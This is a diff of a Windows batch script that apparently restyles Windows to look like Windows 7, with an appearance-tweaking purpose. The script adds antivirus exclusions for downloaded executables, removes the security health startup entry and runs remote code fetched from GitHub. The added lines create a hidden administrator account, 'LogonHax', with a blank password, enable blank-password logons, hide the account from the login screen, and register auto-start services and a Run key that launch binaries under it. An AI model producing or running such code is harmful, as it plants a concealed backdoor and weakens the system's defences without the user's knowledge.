@@ -1,7 +1,6 @@
 @echo off
 whoami /user | findstr /i /c:S-1-5-18 >nul || ( call :RunAsTI "%~f0" %* & exit /b )
-powershell -ec QQBkAGQALQBUAHkAcABlACAALQBNAGUAbQBiAGUAcgBEAGUAZgBpAG4AaQB0AGkAbwBuACAAJwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgB1AHMAZQByADMAMgAuAGQAbABsACIAKQBdACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAbABvAG4AZwAgAFMAZQB0AFcAaQBuAGQAbwB3AEwAbwBuAGcAUAB0AHIAKABsAG8AbgBnACAAaABXAG4AZAAsACAAbABvAG4AZwAgAG4ASQBuAGQAZQB4ACwAIABsAG8AbgBnACAAZAB3AE4AZQB3AEwAbwBuAGcAKQA7AFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACIAKQBdACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABHAGUAdABDAG8AbgBzAG8AbABlAFcAaQBuAGQAbwB3ACgAKQA7ACcAIAAtAG4AYQBtAGUAIABOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzACAALQBuAGEAbQBlAHMAcABhAGMAZQAgAFcAaQBuADMAMgA7AFsAVwBpAG4AMwAyAC4ATgBhAHQAaQB2AGUATQBlAHQAaABvAGQAcwBdADoAOgBTAGUAdABXAGkAbgBkAG8AdwBMAG8AbgBnAFAAdAByACgAWwBXAGkAbgAzADIALgBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAF0AOgA6AEcAZQB0AEMAbwBuAHMAbwBsAGUAVwBpAG4AZABvAHcAKAApACwAIAAtADEANgAsACAAMAB4ADEAMABDADAAMAAwADAAMABMACkAIAB8ACAATwB1AHQALQBOAHUAbABsAA==
-curl https://dl.dropbox.com/scl/fi/g1r37dl8u0rm588cabc65/Get7.zip?rlkey=pd9a5ufs3ndl99cl9oryt81qw -Lo "%temp%\Get7.zip"
+curl https://dl.dropbox.com/scl/fi/wq2bk3y4m1k5lv4im1pd6/Get7.zip?rlkey=8r6uetucfzb0ivwplfflppi1y -Lo "%temp%\Get7.zip"
 powershell Add-MpPreference -ExclusionPath '%temp%\Get7\Windows\Win7Volume.exe'
 powershell Add-MpPreference -ExclusionPath '%temp%\Get7\Windows\PENetwork.exe'
 powershell Add-MpPreference -ExclusionPath '%temp%\Get7\WB11.exe'
@@ -11,8 +10,20 @@ cd /d "%temp%\Get7"
 taskkill /f /im explorer.exe
 powershell Add-MpPreference -ExclusionPath '%windir%\PENetwork.exe'
 powershell Add-MpPreference -ExclusionPath '%windir%\Win7Volume.exe'
+powershell Add-MpPreference -ExclusionPath '%programfiles(x86)%\ClassicLogonShell'
 powershell Copy-Item -Path """$env:temp\Get7\Windows\*""" -Destination """$env:windir""" -Recurse -Force
+powershell Copy-Item -Path """$env:temp\Get7\ClassicLogonShell""" -Destination """${env:programfiles(x86)}\""" -Recurse -Force
+sc create "Classic Logon Shell Launcher Service" type= own start= auto error= ignore binpath= "%programfiles(x86)%\ClassicLogonShell\LauncherService.exe"
 start explorer
+reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f
+net user LogonHax /add
+net localgroup Administrators /add LogonHax
+net user LogonHax ""
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v LogonHax /t REG_DWORD /d 0 /f
+sc create LogonHax type= own start= auto error= ignore binpath= "%programfiles(x86)%\ClassicLogonShell\nssm.exe" obj= %computername%\LogonHax password= ""
+reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\logonhax\Parameters /v AppDirectory /t REG_SZ /d "C:\Program Files (x86)\ClassicLogonShell" /f
+reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\logonhax\Parameters /v Application /t REG_SZ /d "C:\Program Files (x86)\ClassicLogonShell\psexecl.exe" /f
+reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\logonhax\Parameters /v AppParameters /t REG_SZ /d "-sx """C:\Program Files (x86)\ClassicLogonShell\logonhax2.exe"""" /f
 powershell iex ^(^(iwr -UseBasicParsing https://github.com/AveYo/fox/raw/main/Edge_Removal.bat^).Content.replace^('-nop -noe', '-nop'^)^)
 start /wait "" "%temp%\Get7\Win7Edge.exe" /silentinstall "%temp%\Get7\Win7Edge.ini"
 pushd "%temp%\Get7\Win7Boot"
@@ -135,6 +146,7 @@ reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer /v 
 reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Battery Mode" /t REG_SZ /d BatteryMode64 /f
 reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "PENetwork" /t REG_SZ /d PENetwork /f
 reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Classic Volume" /t REG_SZ /d Win7Volume /f
+reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "LogonHax User Mode Service" /t REG_SZ /d "C:\Program Files (x86)\ClassicLogonShell\LogonHax2.exe" /f
 reg add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f
 reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v SecurityHealth /f
 reg add "HKEY_CURRENT_USER\SOFTWARE\VMware, Inc.\VMware Tools" /v ShowTray /t REG_DWORD /d 1 /f
